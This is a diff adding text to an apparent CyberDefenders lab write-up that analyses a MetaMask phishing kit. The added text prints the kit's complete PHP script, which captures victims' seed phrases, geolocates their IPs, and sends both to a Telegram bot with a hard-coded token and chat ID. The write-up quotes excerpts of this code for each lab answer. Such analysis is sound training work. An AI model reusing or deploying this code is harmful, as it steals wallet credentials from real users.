@@ -4,7 +4,7 @@ draft: false
 date: 2026-10-30T03:16:38.930Z
 categories:
   - Writeup
-lastmod: 2026-11-03T05:47:29.049Z
+lastmod: 2026-11-03T09:47:25.957Z
 description: Nothing is that serious, so please choose peace.
 cover: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
 tags:
@@ -411,9 +411,67 @@ The command overwrites `cron`, rendering it to spawn the malicious reverse shell
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 2
 - **Category**: Threat Intel
 
+We are presented with the filesystem of a webpage.
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697271207-c171ec.png)
+
+Go to `index.html`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697329233-28710a.png)
+
+*I suppose the webpage is created for the purpose of social engineering with this suspicious interface...*
+
 **Q1. Which wallet is used for asking the seed phrase?**
 
+I tried to click on those wallets one by one, but there are no responses, except for MetaMask, which tells me `ERR_FILE_NOT_FOUND`. However, in the filesystem, we can see the folder `metamask`, inside which contains another `index.html`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697522218-c49d51.png)
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793697650252-fa0932.png)
+
 `Answer: MetaMask`
+
+This folder also contains `metamask.php`, making the next two questions pretty much no-brainers.
+
+```
+<?php
+
+$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
+$array = json_decode($request);
+$geo = $array->country->name_en;
+$city = $array->city->name_en;
+$date = date("m.d.Y"); //aaja
+
+
+/*
+ With love and respect to all the hustler out there,
+ This is a small gift to my brothers,
+ All the best with your luck,
+ 
+ Regards, 
+ j1j1b1s@m3r0
+*/
+
+    $message = "<b>Welcome 2 The Jungle </b> 
+    
+<b>Wallet:</b> Metamask
+<b>Phrase:</b> <code>" . $_POST["data"] . "</code>
+<b>IP:</b> " .$_SERVER['REMOTE_ADDR'] . " | " .$geo. " | " .$city. "
+<b>User:</b> " . $_SERVER['HTTP_USER_AGENT'] . "";
+
+sendTel($message);  
+	
+    function sendTel($message){
+		$id = "5442785564"; 
+        $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10"; 
+		$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
+		file_get_contents($filename);
+        $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
+        @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);	
+    }
+      
+?>
+```
 
 **Q2. What is the file name that has the code for the phishing kit?**
 
@@ -425,9 +483,36 @@ The command overwrites `cron`, rendering it to spawn the malicious reverse shell
 
 **Q4. What service does the kit use to retrieve the victim's machine information?**
 
+Upon inspecting the PHP code:
+
+```
+$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
+$array = json_decode($request);
+$geo = $array->country->name_en;
+$city = $array->city->name_en;
+$date = date("m.d.Y"); //aaja
+```
+
+I know nothing of `Sypex Geo`, but:
+
+- `http://api...` resembles some kind of services
+- There is `$request`, and `$array`, `$geo`, `$city`, `$date`, all of which seems to extract sensitive geographical information.
+- The `geo` in `sypexgeo` may stands for `geography`.
+
+> Sypex Geo is a high-speed, lightweight tool used to identify a visitor's country, region, city, and geographic coordinates from an IP address
+
 `Answer: Sypex Geo`
 
 **Q5. How many seed phrases were already collected?**
+
+```
+file_get_contents($filename);
+$_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
+@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);
+```
+I suppose the phrases are stored in `/log/log.txt`
+
+![image](/images/posts/cyberdefenders-lab-2f7e08/image-1793698914298-02a847.png)
 
 `Answer: 3`
 
@@ -437,17 +522,31 @@ The command overwrites `cron`, rendering it to spawn the malicious reverse shell
 
 **Q7. Which medium was used for credential dumping?**
 
+```
+$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
+```
+
 `Answer: Telegram`
 
 **Q8. What is the token for accessing the channel?**
+
+```
+$token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10";
+```
 
 `Answer: 5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`
 
 **Q9. What is the Chat ID for the phisher's channel?**
 
+```
+$id = "5442785564";
+```
+
 `Answer: 5442785564`
 
 **Q10. What are the allies of the phish kit developer?**
+
+We can see their names in the comment/message.
 
 `Answer: j1j1b1s@m3r0`
 
